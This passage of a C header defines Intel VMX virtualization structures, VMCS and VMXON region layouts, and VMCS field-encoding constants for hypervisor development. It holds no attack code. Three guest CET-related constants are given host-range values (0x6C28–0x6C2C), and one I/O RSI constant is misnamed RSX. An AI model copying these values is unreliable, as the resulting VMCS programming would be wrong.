   * translate the linear address specified in of the INVVPID descriptor. Linear mappings and
   * combined mappings for that VPID and linear address are invalidated for all PCIDs and, for
   * combined mappings, all EP4TAs. (The instruction may also invalidate mappings associated with
   * other VPIDs and for other linear addresses).
   */
  InvvpidIndividualAddress = 0x00000000,

  /**
   * If the INVVPID type is 1, the logical processor invalidates all linear mappings and combined
   * mappings associated with the VPID specified in the INVVPID descriptor. Linear mappings and
   * combined mappings for that VPID are invalidated for all PCIDs and, for combined mappings, all
   * EP4TAs. (The instruction may also invalidate mappings associated with other VPIDs).
   */
  InvvpidSingleContext = 0x00000001,

  /**
   * If the INVVPID type is 2, the logical processor invalidates linear mappings and combined
   * mappings associated with all VPIDs except VPID 0000H and with all PCIDs. (The instruction may
   * also invalidate linear mappings with VPID 0000H.) Combined mappings are invalidated for all
   * EP4TAs.
   */
  InvvpidAllContext = 0x00000002,

  /**
   * If the INVVPID type is 3, the logical processor invalidates linear mappings and combined
   * mappings associated with the VPID specified in the INVVPID descriptor. Linear mappings and
   * combined mappings for that VPID are invalidated for all PCIDs and, for combined mappings, all
   * EP4TAs. The logical processor is not required to invalidate information that was used for
   * global translations (although it may do so). (The instruction may also invalidate mappings
   * associated with other VPIDs).
   *
   * @see Vol3C[4.10(Caching Translation Information)]
   */
  InvvpidSingleContextRetainingGlobals = 0x00000003,
} INVVPID_TYPE;

typedef struct {
  UINT64 EptPointer;

  /**
   * Must be zero.
   */
  UINT64 Reserved;
} INVEPT_DESCRIPTOR;

typedef struct {
  UINT16 Vpid;

  /**
   * Must be zero.
   */
  UINT16 Reserved1;

  /**
   * Must be zero.
   */
  UINT32 Reserved2;
  UINT64 LinearAddress;
} INVVPID_DESCRIPTOR;

/**
 * @brief Format of the VMCS Region
 *
 * A logical processor uses virtual-machine control data structures (VMCSs) while it is in VMX
 * operation. These manage transitions into and out of VMX non-root operation (VM entries and VM
 * exits) as well as processor behavior in VMX non-root operation. This structure is manipulated by
 * the new instructions VMCLEAR, VMPTRLD, VMREAD, and VMWRITE. A VMCS region comprises up to
 * 4-KBytes. The exact size is implementation specific and can be determined by consulting the VMX
 * capability MSR IA32_VMX_BASIC.
 *
 * @see Vol3C[24.2(FORMAT OF THE VMCS REGION)] (reference)
 */
typedef struct {
  struct {
    /**
     * @brief VMCS revision identifier
     *
     * [Bits 30:0] Processors that maintain VMCS data in different formats (see below) use different
     * VMCS revision identifiers. These identifiers enable software to avoid using a VMCS region
     * formatted for one processor on a processor that uses a different format. Software should
     * write the VMCS revision identifier to the VMCS region before using that region for a VMCS.
     * The VMCS revision identifier is never written by the processor; VMPTRLD fails if its operand
     * references a VMCS region whose VMCS revision identifier differs from that used by the
     * processor. Software can discover the VMCS revision identifier that a processor uses by
     * reading the VMX capability MSR IA32_VMX_BASIC.
     *
     * @see Vol3C[24.6.2(Processor-Based VM-Execution Controls)]
     * @see Vol3D[A.1(BASIC VMX INFORMATION)]
     */
    UINT32 RevisionId : 31;

    /**
     * @brief Shadow-VMCS indicator
     *
     * [Bit 31] Software should clear or set the shadow-VMCS indicator depending on whether the VMCS
     * is to be an ordinary VMCS or a shadow VMCS. VMPTRLD fails if the shadow-VMCS indicator is set
     * and the processor does not support the 1-setting of the "VMCS shadowing" VM-execution
     * control. Software can discover support for this setting by reading the VMX capability MSR
     * IA32_VMX_PROCBASED_CTLS2.
     *
     * @see Vol3C[24.10(VMCS TYPES ORDINARY AND SHADOW)]
     */
    UINT32 ShadowVmcsIndicator : 1;
  };

  /**
   * @brief VMX-abort indicator
   *
   * The contents of these bits do not control processor operation in any way. A logical processor
   * writes a non-zero value into these bits if a VMX abort occurs. Software may also write into
   * this field.
   *
   * @see Vol3D[27.7(VMX Aborts)]
   */
  UINT32 AbortIndicator;

  /**
   * @brief VMCS data (implementation-specific format)
   *
   * These parts of the VMCS control VMX non-root operation and the VMX transitions.
   * The format of these data is implementation-specific. To ensure proper behavior in VMX
   * operation, software should maintain the VMCS region and related structures in writeback
   * cacheable memory. Future implementations may allow or require a different memory type. Software
   * should consult the VMX capability MSR IA32_VMX_BASIC.
   *
   * @see Vol3C[24.11.4(Software Access to Related Structures)]
   * @see Vol3D[A.1(BASIC VMX INFORMATION)]
   */
  UINT8 Data[4088];
} VMCS;

/**
 * @brief Format of the VMXON Region
 *
 * Before executing VMXON, software allocates a region of memory that the logical processor uses to
 * support VMX operation. This region is called the VMXON region. A VMXON region comprises up to
 * 4-KBytes. The exact size is implementation specific and can be determined by consulting the VMX
 * capability MSR IA32_VMX_BASIC.
 *
 * @see Vol3C[24.11.5(VMXON Region)] (reference)
 */
typedef struct {
  struct {
    /**
     * @brief VMCS revision identifier
     *
     * [Bits 30:0] Before executing VMXON, software should write the VMCS revision identifier to the
     * VMXON region. (Specifically, it should write the 31-bit VMCS revision identifier to bits 30:0
     * of the first 4 bytes of the VMXON region; bit 31 should be cleared to 0.)
     *
     * @see VMCS
     * @see Vol3C[24.2(FORMAT OF THE VMCS REGION)]
     * @see Vol3C[24.11.5(VMXON Region)]
     */
    UINT32 RevisionId : 31;

    /**
     * [Bit 31] Bit 31 is always 0.
     */
    UINT32 MustBeZero : 1;
  };

  /**
   * @brief VMXON data (implementation-specific format)
   *
   * The format of these data is implementation-specific. To ensure proper behavior in VMX
   * operation, software should not access or modify the VMXON region of a logical processor between
   * execution of VMXON and VMXOFF on that logical processor. Doing otherwise may lead to
   * unpredictable behavior.
   *
   * @see Vol3C[24.11.4(Software Access to Related Structures)]
   * @see Vol3D[A.1(BASIC VMX INFORMATION)]
   */
  UINT8 Data[4092];
} VMXON;

/**
 * @defgroup VMCS_FIELDS \
 *           VMCS (VM Control Structure)
 *
 * Every component of the VMCS is encoded by a 32-bit field that can be used by VMREAD and VMWRITE.
 * This enumerates all fields in the VMCS and their encodings. Fields are grouped by width (16-bit,
 * 32-bit, etc.) and type (guest-state, host-state, etc.).
 *
 * @see Vol3D[B(APPENDIX B FIELD ENCODING IN VMCS)] (reference)
 * @{
 */
typedef union {
  struct {
    /**
     * [Bit 0] Access type (0 = full; 1 = high); must be full for 16-bit, 32-bit, and natural-width
     * fields.
     */
    UINT16 AccessType : 1;
#define VMCS_COMPONENT_ENCODING_ACCESS_TYPE_BIT 0
#define VMCS_COMPONENT_ENCODING_ACCESS_TYPE_FLAG 0x01
#define VMCS_COMPONENT_ENCODING_ACCESS_TYPE_MASK 0x01
#define VMCS_COMPONENT_ENCODING_ACCESS_TYPE(_) (((_) >> 0) & 0x01)

    /**
     * [Bits 9:1] Index.
     */
    UINT16 Index : 9;
#define VMCS_COMPONENT_ENCODING_INDEX_BIT 1
#define VMCS_COMPONENT_ENCODING_INDEX_FLAG 0x3FE
#define VMCS_COMPONENT_ENCODING_INDEX_MASK 0x1FF
#define VMCS_COMPONENT_ENCODING_INDEX(_) (((_) >> 1) & 0x1FF)

    /**
     * [Bits 11:10] Type:
     * 0: control
     * 1: VM-exit information
     * 2: guest state
     * 3: host state
     */
    UINT16 Type : 2;
#define VMCS_COMPONENT_ENCODING_TYPE_BIT 10
#define VMCS_COMPONENT_ENCODING_TYPE_FLAG 0xC00
#define VMCS_COMPONENT_ENCODING_TYPE_MASK 0x03
#define VMCS_COMPONENT_ENCODING_TYPE(_) (((_) >> 10) & 0x03)

    /**
     * [Bit 12] Reserved (must be 0).
     */
    UINT16 MustBeZero : 1;
#define VMCS_COMPONENT_ENCODING_MUST_BE_ZERO_BIT 12
#define VMCS_COMPONENT_ENCODING_MUST_BE_ZERO_FLAG 0x1000
#define VMCS_COMPONENT_ENCODING_MUST_BE_ZERO_MASK 0x01
#define VMCS_COMPONENT_ENCODING_MUST_BE_ZERO(_) (((_) >> 12) & 0x01)

    /**
     * [Bits 14:13] Width:
     * 0: 16-bit
     * 1: 64-bit
     * 2: 32-bit
     * 3: natural-width
     */
    UINT16 Width : 2;
#define VMCS_COMPONENT_ENCODING_WIDTH_BIT 13
#define VMCS_COMPONENT_ENCODING_WIDTH_FLAG 0x6000
#define VMCS_COMPONENT_ENCODING_WIDTH_MASK 0x03
#define VMCS_COMPONENT_ENCODING_WIDTH(_) (((_) >> 13) & 0x03)
    UINT16 Reserved1 : 1;
  };

  UINT16 Flags;
} VMCS_COMPONENT_ENCODING;

/**
 * @defgroup VMCS_16_BIT \
 *           16-Bit Fields
 *
 * 16-Bit Fields.
 *
 * @see Vol3D[B.1(16-BIT FIELDS)] (reference)
 * @{
 */
/**
 * @defgroup VMCS_16_BIT_CONTROL_FIELDS \
 *           16-Bit Control Fields
 *
 * 16-Bit Control Fields.
 * @{
 */
/**
 * Virtual-processor identifier (VPID).
 *
 * @remarks This field exists only on processors that support the 1-setting of the "enable VPID"
 * VM-execution control.
 */
#define VMCS_CTRL_VIRTUAL_PROCESSOR_IDENTIFIER 0x00000000

/**
 * Posted-interrupt notification vector.
 *
 * @remarks This field exists only on processors that support the 1-setting of the "process posted
 * interrupts" VM-execution control.
 */
#define VMCS_CTRL_POSTED_INTERRUPT_NOTIFICATION_VECTOR 0x00000002

/**
 * EPTP index.
 *
 * @remarks This field exists only on processors that support the 1-setting of the "EPT-violation
 * \#VE" VM-execution control.
 */
#define VMCS_CTRL_EPTP_INDEX 0x00000004
/**
 * @}
 */

/**
 * @defgroup VMCS_16_BIT_GUEST_STATE_FIELDS \
 *           16-Bit Guest-State Fields
 *
 * 16-Bit Guest-State Fields.
 * @{
 */
/**
 * Guest ES selector.
 */
#define VMCS_GUEST_ES_SELECTOR 0x00000800

/**
 * Guest CS selector.
 */
#define VMCS_GUEST_CS_SELECTOR 0x00000802

/**
 * Guest SS selector.
 */
#define VMCS_GUEST_SS_SELECTOR 0x00000804

/**
 * Guest DS selector.
 */
#define VMCS_GUEST_DS_SELECTOR 0x00000806

/**
 * Guest FS selector.
 */
#define VMCS_GUEST_FS_SELECTOR 0x00000808

/**
 * Guest GS selector.
 */
#define VMCS_GUEST_GS_SELECTOR 0x0000080A

/**
 * Guest LDTR selector.
 */
#define VMCS_GUEST_LDTR_SELECTOR 0x0000080C

/**
 * Guest TR selector.
 */
#define VMCS_GUEST_TR_SELECTOR 0x0000080E

/**
 * Guest interrupt status.
 *
 * @remarks This field exists only on processors that support the 1-setting of the
 * "virtual-interrupt delivery" VM-execution control.
 */
#define VMCS_GUEST_INTERRUPT_STATUS 0x00000810

/**
 * PML index.
 *
 * @remarks This field exists only on processors that support the 1-setting of the "enable PML"
 * VM-execution control.
 */
#define VMCS_GUEST_PML_INDEX 0x00000812
/**
 * @}
 */

/**
 * @defgroup VMCS_16_BIT_HOST_STATE_FIELDS \
 *           16-Bit Host-State Fields
 *
 * 16-Bit Host-State Fields.
 * @{
 */
/**
 * Host ES selector.
 */
#define VMCS_HOST_ES_SELECTOR 0x00000C00

/**
 * Host CS selector.
 */
#define VMCS_HOST_CS_SELECTOR 0x00000C02

/**
 * Host SS selector.
 */
#define VMCS_HOST_SS_SELECTOR 0x00000C04

/**
 * Host DS selector.
 */
#define VMCS_HOST_DS_SELECTOR 0x00000C06

/**
 * Host FS selector.
 */
#define VMCS_HOST_FS_SELECTOR 0x00000C08

/**
 * Host GS selector.
 */
#define VMCS_HOST_GS_SELECTOR 0x00000C0A

/**
 * Host TR selector.
 */
#define VMCS_HOST_TR_SELECTOR 0x00000C0C
/**
 * @}
 */

/**
 * @}
 */

/**
 * @defgroup VMCS_64_BIT \
 *           64-Bit Fields
 *
 * 64-Bit Fields.
 *
 * @see Vol3D[B.2(64-BIT FIELDS)] (reference)
 * @{
 */
/**
 * @defgroup VMCS_64_BIT_CONTROL_FIELDS \
 *           64-Bit Control Fields
 *
 * 64-Bit Control Fields.
 * @{
 */
/**
 * Address of I/O bitmap A.
 */
#define VMCS_CTRL_IO_BITMAP_A_ADDRESS 0x00002000

/**
 * Address of I/O bitmap B.
 */
#define VMCS_CTRL_IO_BITMAP_B_ADDRESS 0x00002002

/**
 * Address of MSR bitmaps.
 */
#define VMCS_CTRL_MSR_BITMAP_ADDRESS 0x00002004

/**
 * VM-exit MSR-store address.
 */
#define VMCS_CTRL_VMEXIT_MSR_STORE_ADDRESS 0x00002006

/**
 * VM-exit MSR-load address.
 */
#define VMCS_CTRL_VMEXIT_MSR_LOAD_ADDRESS 0x00002008

/**
 * VM-entry MSR-load address.
 */
#define VMCS_CTRL_VMENTRY_MSR_LOAD_ADDRESS 0x0000200A

/**
 * Executive-VMCS pointer.
 */
#define VMCS_CTRL_EXECUTIVE_VMCS_POINTER 0x0000200C

/**
 * PML address.
 */
#define VMCS_CTRL_PML_ADDRESS 0x0000200E

/**
 * TSC offset.
 */
#define VMCS_CTRL_TSC_OFFSET 0x00002010

/**
 * Virtual-APIC address.
 */
#define VMCS_CTRL_VIRTUAL_APIC_ADDRESS 0x00002012

/**
 * APIC-access address.
 */
#define VMCS_CTRL_APIC_ACCESS_ADDRESS 0x00002014

/**
 * Posted-interrupt descriptor address
 */
#define VMCS_CTRL_POSTED_INTERRUPT_DESCRIPTOR_ADDRESS 0x00002016

/**
 * VM-function controls.
 */
#define VMCS_CTRL_VMFUNC_CONTROLS 0x00002018

/**
 * EPT pointer.
 */
#define VMCS_CTRL_EPT_POINTER 0x0000201A

/**
 * EOI-exit bitmap 0.
 */
#define VMCS_CTRL_EOI_EXIT_BITMAP_0 0x0000201C

/**
 * EOI-exit bitmap 1.
 */
#define VMCS_CTRL_EOI_EXIT_BITMAP_1 0x0000201E

/**
 * EOI-exit bitmap 2.
 */
#define VMCS_CTRL_EOI_EXIT_BITMAP_2 0x00002020

/**
 * EOI-exit bitmap 3.
 */
#define VMCS_CTRL_EOI_EXIT_BITMAP_3 0x00002022

/**
 * EPTP-list address.
 */
#define VMCS_CTRL_EPT_POINTER_LIST_ADDRESS 0x00002024

/**
 * VMREAD-bitmap address.
 */
#define VMCS_CTRL_VMREAD_BITMAP_ADDRESS 0x00002026

/**
 * VMWRITE-bitmap address.
 */
#define VMCS_CTRL_VMWRITE_BITMAP_ADDRESS 0x00002028

/**
 * Virtualization-exception information address.
 */
#define VMCS_CTRL_VIRTUALIZATION_EXCEPTION_INFORMATION_ADDRESS 0x0000202A

/**
 * XSS-exiting bitmap.
 */
#define VMCS_CTRL_XSS_EXITING_BITMAP 0x0000202C

/**
 * ENCLS-exiting bitmap.
 */
#define VMCS_CTRL_ENCLS_EXITING_BITMAP 0x0000202E

/**
 * TSC multiplier.
 */
#define VMCS_CTRL_TSC_MULTIPLIER 0x00002032
/**
 * @}
 */

/**
 * @defgroup VMCS_64_BIT_READ_ONLY_DATA_FIELDS \
 *           64-Bit Read-Only Data Field
 *
 * 64-Bit Read-Only Data Field.
 * @{
 */
/**
 * Guest-physical address.
 */
#define VMCS_GUEST_PHYSICAL_ADDRESS 0x00002400
/**
 * @}
 */

/**
 * @defgroup VMCS_64_BIT_GUEST_STATE_FIELDS \
 *           64-Bit Guest-State Fields
 *
 * 64-Bit Guest-State Fields.
 * @{
 */
/**
 * VMCS link pointer.
 */
#define VMCS_GUEST_VMCS_LINK_POINTER 0x00002800

/**
 * Guest IA32_DEBUGCTL.
 */
#define VMCS_GUEST_DEBUGCTL 0x00002802

/**
 * Guest IA32_PAT.
 */
#define VMCS_GUEST_PAT 0x00002804

/**
 * Guest IA32_EFER.
 */
#define VMCS_GUEST_EFER 0x00002806

/**
 * Guest IA32_PERF_GLOBAL_CTRL.
 */
#define VMCS_GUEST_PERF_GLOBAL_CTRL 0x00002808

/**
 * Guest PDPTE0.
 */
#define VMCS_GUEST_PDPTE0 0x0000280A

/**
 * Guest PDPTE1.
 */
#define VMCS_GUEST_PDPTE1 0x0000280C

/**
 * Guest PDPTE2.
 */
#define VMCS_GUEST_PDPTE2 0x0000280E

/**
 * Guest PDPTE3.
 */
#define VMCS_GUEST_PDPTE3 0x00002810

/**
 * Guest IA32_BNDCFGS.
 */
#define VMCS_GUEST_BNDCFGS 0x00002812

/**
 * Guest IA32_RTIT_CTL.
 */
#define VMCS_GUEST_RTIT_CTL 0x00002814
/**
 * @}
 */

/**
 * @defgroup VMCS_64_BIT_HOST_STATE_FIELDS \
 *           64-Bit Host-State Fields
 *
 * 64-Bit Host-State Fields.
 * @{
 */
/**
 * Host IA32_PAT.
 */
#define VMCS_HOST_PAT 0x00002C00

/**
 * Host IA32_EFER.
 */
#define VMCS_HOST_EFER 0x00002C02

/**
 * Host IA32_PERF_GLOBAL_CTRL.
 */
#define VMCS_HOST_PERF_GLOBAL_CTRL 0x00002C04
/**
 * @}
 */

/**
 * @}
 */

/**
 * @defgroup VMCS_32_BIT \
 *           32-Bit Fields
 *
 * 32-Bit Fields.
 *
 * @see Vol3D[B.3(32-BIT FIELDS)] (reference)
 * @{
 */
/**
 * @defgroup VMCS_32_BIT_CONTROL_FIELDS \
 *           32-Bit Control Fields
 *
 * 32-Bit Control Fields.
 * @{
 */
/**
 * Pin-based VM-execution controls.
 */
#define VMCS_CTRL_PIN_BASED_VM_EXECUTION_CONTROLS 0x00004000

/**
 * Primary processor-based VM-execution controls.
 */
#define VMCS_CTRL_PROCESSOR_BASED_VM_EXECUTION_CONTROLS 0x00004002

/**
 * Exception bitmap.
 */
#define VMCS_CTRL_EXCEPTION_BITMAP 0x00004004

/**
 * Page-fault error-code mask.
 */
#define VMCS_CTRL_PAGEFAULT_ERROR_CODE_MASK 0x00004006

/**
 * Page-fault error-code match.
 */
#define VMCS_CTRL_PAGEFAULT_ERROR_CODE_MATCH 0x00004008

/**
 * CR3-target count.
 */
#define VMCS_CTRL_CR3_TARGET_COUNT 0x0000400A

/**
 * VM-exit controls.
 */
#define VMCS_CTRL_VMEXIT_CONTROLS 0x0000400C

/**
 * VM-exit MSR-store count.
 */
#define VMCS_CTRL_VMEXIT_MSR_STORE_COUNT 0x0000400E

/**
 * VM-exit MSR-load count.
 */
#define VMCS_CTRL_VMEXIT_MSR_LOAD_COUNT 0x00004010

/**
 * VM-entry controls.
 */
#define VMCS_CTRL_VMENTRY_CONTROLS 0x00004012

/**
 * VM-entry MSR-load count.
 */
#define VMCS_CTRL_VMENTRY_MSR_LOAD_COUNT 0x00004014

/**
 * VM-entry interruption-information field.
 */
#define VMCS_CTRL_VMENTRY_INTERRUPTION_INFORMATION_FIELD 0x00004016

/**
 * VM-entry exception error code.
 */
#define VMCS_CTRL_VMENTRY_EXCEPTION_ERROR_CODE 0x00004018

/**
 * VM-entry instruction length.
 */
#define VMCS_CTRL_VMENTRY_INSTRUCTION_LENGTH 0x0000401A

/**
 * TPR threshold.
 */
#define VMCS_CTRL_TPR_THRESHOLD 0x0000401C

/**
 * Secondary processor-based VM-execution controls.
 */
#define VMCS_CTRL_SECONDARY_PROCESSOR_BASED_VM_EXECUTION_CONTROLS 0x0000401E

/**
 * PLE_Gap.
 */
#define VMCS_CTRL_PLE_GAP 0x00004020

/**
 * PLE_Window.
 */
#define VMCS_CTRL_PLE_WINDOW 0x00004022
/**
 * @}
 */

/**
 * @defgroup VMCS_32_BIT_READ_ONLY_DATA_FIELDS \
 *           32-Bit Read-Only Data Fields
 *
 * 32-Bit Read-Only Data Fields.
 * @{
 */
/**
 * VM-instruction error.
 */
#define VMCS_VM_INSTRUCTION_ERROR 0x00004400

/**
 * Exit reason.
 */
#define VMCS_EXIT_REASON 0x00004402

/**
 * VM-exit interruption information.
 */
#define VMCS_VMEXIT_INTERRUPTION_INFORMATION 0x00004404

/**
 * VM-exit interruption error code.
 */
#define VMCS_VMEXIT_INTERRUPTION_ERROR_CODE 0x00004406

/**
 * IDT-vectoring information field.
 */
#define VMCS_IDT_VECTORING_INFORMATION 0x00004408

/**
 * IDT-vectoring error code.
 */
#define VMCS_IDT_VECTORING_ERROR_CODE 0x0000440A

/**
 * VM-exit instruction length.
 */
#define VMCS_VMEXIT_INSTRUCTION_LENGTH 0x0000440C

/**
 * VM-exit instruction information.
 */
#define VMCS_VMEXIT_INSTRUCTION_INFO 0x0000440E
/**
 * @}
 */

/**
 * @defgroup VMCS_32_BIT_GUEST_STATE_FIELDS \
 *           32-Bit Guest-State Fields
 *
 * 32-Bit Guest-State Fields.
 * @{
 */
/**
 * Guest ES limit.
 */
#define VMCS_GUEST_ES_LIMIT 0x00004800

/**
 * Guest CS limit.
 */
#define VMCS_GUEST_CS_LIMIT 0x00004802

/**
 * Guest SS limit.
 */
#define VMCS_GUEST_SS_LIMIT 0x00004804

/**
 * Guest DS limit.
 */
#define VMCS_GUEST_DS_LIMIT 0x00004806

/**
 * Guest FS limit.
 */
#define VMCS_GUEST_FS_LIMIT 0x00004808

/**
 * Guest GS limit.
 */
#define VMCS_GUEST_GS_LIMIT 0x0000480A

/**
 * Guest LDTR limit.
 */
#define VMCS_GUEST_LDTR_LIMIT 0x0000480C

/**
 * Guest TR limit.
 */
#define VMCS_GUEST_TR_LIMIT 0x0000480E

/**
 * Guest GDTR limit.
 */
#define VMCS_GUEST_GDTR_LIMIT 0x00004810

/**
 * Guest IDTR limit.
 */
#define VMCS_GUEST_IDTR_LIMIT 0x00004812

/**
 * Guest ES access rights.
 */
#define VMCS_GUEST_ES_ACCESS_RIGHTS 0x00004814

/**
 * Guest CS access rights.
 */
#define VMCS_GUEST_CS_ACCESS_RIGHTS 0x00004816

/**
 * Guest SS access rights.
 */
#define VMCS_GUEST_SS_ACCESS_RIGHTS 0x00004818

/**
 * Guest DS access rights.
 */
#define VMCS_GUEST_DS_ACCESS_RIGHTS 0x0000481A

/**
 * Guest FS access rights.
 */
#define VMCS_GUEST_FS_ACCESS_RIGHTS 0x0000481C

/**
 * Guest GS access rights.
 */
#define VMCS_GUEST_GS_ACCESS_RIGHTS 0x0000481E

/**
 * Guest LDTR access rights.
 */
#define VMCS_GUEST_LDTR_ACCESS_RIGHTS 0x00004820

/**
 * Guest TR access rights.
 */
#define VMCS_GUEST_TR_ACCESS_RIGHTS 0x00004822

/**
 * Guest interruptibility state.
 */
#define VMCS_GUEST_INTERRUPTIBILITY_STATE 0x00004824

/**
 * Guest activity state.
 */
#define VMCS_GUEST_ACTIVITY_STATE 0x00004826

/**
 * Guest SMBASE.
 */
#define VMCS_GUEST_SMBASE 0x00004828

/**
 * Guest IA32_SYSENTER_CS.
 */
#define VMCS_GUEST_SYSENTER_CS 0x0000482A

/**
 * VMX-preemption timer value.
 */
#define VMCS_GUEST_VMX_PREEMPTION_TIMER_VALUE 0x0000482E
/**
 * @}
 */

/**
 * @defgroup VMCS_32_BIT_HOST_STATE_FIELDS \
 *           32-Bit Host-State Field
 *
 * 32-Bit Host-State Field.
 * @{
 */
/**
 * Host IA32_SYSENTER_CS.
 */
#define VMCS_HOST_SYSENTER_CS 0x00004C00
/**
 * @}
 */

/**
 * @}
 */

/**
 * @defgroup VMCS_NATURAL_WIDTH \
 *           Natural-Width Fields
 *
 * Natural-Width Fields.
 *
 * @see Vol3D[B.4(NATURAL-WIDTH FIELDS)] (reference)
 * @{
 */
/**
 * @defgroup VMCS_NATURAL_WIDTH_CONTROL_FIELDS \
 *           Natural-Width Control Fields
 *
 * Natural-Width Control Fields
 * @{
 */
/**
 * CR0 guest/host mask.
 */
#define VMCS_CTRL_CR0_GUEST_HOST_MASK 0x00006000

/**
 * CR4 guest/host mask.
 */
#define VMCS_CTRL_CR4_GUEST_HOST_MASK 0x00006002

/**
 * CR0 read shadow.
 */
#define VMCS_CTRL_CR0_READ_SHADOW 0x00006004

/**
 * CR4 read shadow.
 */
#define VMCS_CTRL_CR4_READ_SHADOW 0x00006006

/**
 * CR3-target value 0.
 */
#define VMCS_CTRL_CR3_TARGET_VALUE_0 0x00006008

/**
 * CR3-target value 1.
 */
#define VMCS_CTRL_CR3_TARGET_VALUE_1 0x0000600A

/**
 * CR3-target value 2.
 */
#define VMCS_CTRL_CR3_TARGET_VALUE_2 0x0000600C

/**
 * CR3-target value 3.
 */
#define VMCS_CTRL_CR3_TARGET_VALUE_3 0x0000600E
/**
 * @}
 */

/**
 * @defgroup VMCS_NATURAL_WIDTH_READ_ONLY_DATA_FIELDS \
 *           Natural-Width Read-Only Data Fields
 *
 * Natural-Width Read-Only Data Fields.
 * @{
 */
/**
 * Exit qualification.
 */
#define VMCS_EXIT_QUALIFICATION 0x00006400

/**
 * I/O RCX.
 */
#define VMCS_IO_RCX 0x00006402

/**
 * I/O RSI.
 */
#define VMCS_IO_RSX 0x00006404

/**
 * I/O RDI.
 */
#define VMCS_IO_RDI 0x00006406

/**
 * I/O RIP.
 */
#define VMCS_IO_RIP 0x00006408

/**
 * Guest-linear address.
 */
#define VMCS_EXIT_GUEST_LINEAR_ADDRESS 0x0000640A
/**
 * @}
 */

/**
 * @defgroup VMCS_NATURAL_WIDTH_GUEST_STATE_FIELDS \
 *           Natural-Width Guest-State Fields
 *
 * Natural-Width Guest-State Fields.
 * @{
 */
/**
 * Guest CR0.
 */
#define VMCS_GUEST_CR0 0x00006800

/**
 * Guest CR3.
 */
#define VMCS_GUEST_CR3 0x00006802

/**
 * Guest CR4.
 */
#define VMCS_GUEST_CR4 0x00006804

/**
 * Guest ES base.
 */
#define VMCS_GUEST_ES_BASE 0x00006806

/**
 * Guest CS base.
 */
#define VMCS_GUEST_CS_BASE 0x00006808

/**
 * Guest SS base.
 */
#define VMCS_GUEST_SS_BASE 0x0000680A

/**
 * Guest DS base.
 */
#define VMCS_GUEST_DS_BASE 0x0000680C

/**
 * Guest FS base.
 */
#define VMCS_GUEST_FS_BASE 0x0000680E

/**
 * Guest GS base.
 */
#define VMCS_GUEST_GS_BASE 0x00006810

/**
 * Guest LDTR base.
 */
#define VMCS_GUEST_LDTR_BASE 0x00006812

/**
 * Guest TR base.
 */
#define VMCS_GUEST_TR_BASE 0x00006814

/**
 * Guest GDTR base.
 */
#define VMCS_GUEST_GDTR_BASE 0x00006816

/**
 * Guest IDTR base.
 */
#define VMCS_GUEST_IDTR_BASE 0x00006818

/**
 * Guest DR7.
 */
#define VMCS_GUEST_DR7 0x0000681A

/**
 * Guest RSP.
 */
#define VMCS_GUEST_RSP 0x0000681C

/**
 * Guest RIP.
 */
#define VMCS_GUEST_RIP 0x0000681E

/**
 * Guest RFLAGS.
 */
#define VMCS_GUEST_RFLAGS 0x00006820

/**
 * Guest pending debug exceptions.
 */
#define VMCS_GUEST_PENDING_DEBUG_EXCEPTIONS 0x00006822

/**
 * Guest IA32_SYSENTER_ESP.
 */
#define VMCS_GUEST_SYSENTER_ESP 0x00006824

/**
 * Guest IA32_SYSENTER_EIP.
 */
#define VMCS_GUEST_SYSENTER_EIP 0x00006826

/**
 * Guest IA32_S_CET.
 */
#define VMCS_GUEST_S_CET 0x00006C28

/**
 * Guest SSP.
 */
#define VMCS_GUEST_SSP 0x00006C2A

/**
 * Guest IA32_INTERRUPT_SSP_TABLE_ADDR.
 */
#define VMCS_GUEST_INTERRUPT_SSP_TABLE_ADDR 0x00006C2C
/**
 * @}
 */

/**
 * @defgroup VMCS_NATURAL_WIDTH_HOST_STATE_FIELDS \
 *           Natural-Width Host-State Fields
 *
 * Natural-Width Host-State Fields.
 * @{
 */
/**
 * Host CR0.
 */
#define VMCS_HOST_CR0 0x00006C00

/**
 * Host CR3.
 */
#define VMCS_HOST_CR3 0x00006C02

/**
 * Host CR4.
 */
#define VMCS_HOST_CR4 0x00006C04

/**
 * Host FS base.
 */
#define VMCS_HOST_FS_BASE 0x00006C06

/**
 * Host GS base.
 */
#define VMCS_HOST_GS_BASE 0x00006C08

/**
 * Host TR base.
 */
#define VMCS_HOST_TR_BASE 0x00006C0A

/**
 * Host GDTR base.
 */
#define VMCS_HOST_GDTR_BASE 0x00006C0C

/**
 * Host IDTR base.
 */
#define VMCS_HOST_IDTR_BASE 0x00006C0E

/**
 * Host IA32_SYSENTER_ESP.
 */
#define VMCS_HOST_SYSENTER_ESP 0x00006C10

/**
 * Host IA32_SYSENTER_EIP.
 */
#define VMCS_HOST_SYSENTER_EIP 0x00006C12

/**
 * Host RSP.
 */
#define VMCS_HOST_RSP 0x00006C14

/**
 * Host RIP.
 */
#define VMCS_HOST_RIP 0x00006C16

/**
 * Host IA32_S_CET.
 */
#define VMCS_HOST_S_CET 0x00006C18

/**
 * Host SSP.
 */
#define VMCS_HOST_SSP 0x00006C1A

/**
 * Host IA32_INTERRUPT_SSP_TABLE_ADDR.
 */
#define VMCS_HOST_INTERRUPT_SSP_TABLE_ADDR 0x00006C1C
/**
 * @}
 */

/**
 * @}
 */

/**
 * @}
 */

/**
 * @brief Valid interruption types
 */
typedef enum {
  /**
   * External interrupt.
   */
  ExternalInterrupt = 0x00000000,

  /**
   * Non-maskable interrupt (NMI).
   */
  NonMaskableInterrupt = 0x00000002,

  /**
   * Hardware exception (e.g,. \#PF).
   */
  HardwareException = 0x00000003,

  /**
   * Software interrupt (INT n).
   */
  SoftwareInterrupt = 0x00000004,

  /**
   * Privileged software exception (INT1).
   */
  PrivilegedSoftwareException = 0x00000005,

  /**
   * Software exception (INT3 or INTO).
   */
  SoftwareException = 0x00000006,

  /**
   * Other event. This type is used for injection of events that are not delivered through the IDT.
   */
  OtherEvent = 0x00000007,
} INTERRUPTION_TYPE;

/**
 * @brief VM entry can be configured to conclude by delivering an event through the IDT (after all
 * guest state and MSRs have been loaded). This process is called event injection and is controlled
 * by these VM-entry control fields
 *
 * @see Vol3A[24.8.3(VM-Entry Controls for Event Injection)] (reference)
 */
typedef union {
  struct {
    /**
     * @brief Vector of interrupt or exception
     *
     * [Bits 7:0] Determines which entry in the IDT is used or which other event is injected.
     */
    UINT32 Vector : 8;
#define VMENTRY_INTERRUPT_INFORMATION_VECTOR_BIT 0
#define VMENTRY_INTERRUPT_INFORMATION_VECTOR_FLAG 0xFF
#define VMENTRY_INTERRUPT_INFORMATION_VECTOR_MASK 0xFF
